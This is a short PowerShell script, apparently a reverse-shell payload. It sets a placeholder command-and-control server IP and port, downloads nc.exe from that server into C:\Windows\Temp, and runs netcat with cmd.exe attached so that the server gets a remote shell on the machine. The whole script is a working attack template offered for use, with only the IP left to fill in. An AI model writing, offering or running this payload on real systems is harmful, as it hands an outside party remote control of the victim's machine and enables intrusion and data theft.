# ENTER your C2-SERVER-IP
$c2serverip = "C2-SERVER-IP"
$c2port = "9999"

# download netcat from C2
powershell wget -Uri http://$c2serverip/nc.exe -OutFile C:\Windows\Temp\nc.exe

# connect to c2 with netcat
C:\Windows\Temp\nc.exe -e cmd.exe $c2serverip $c2port
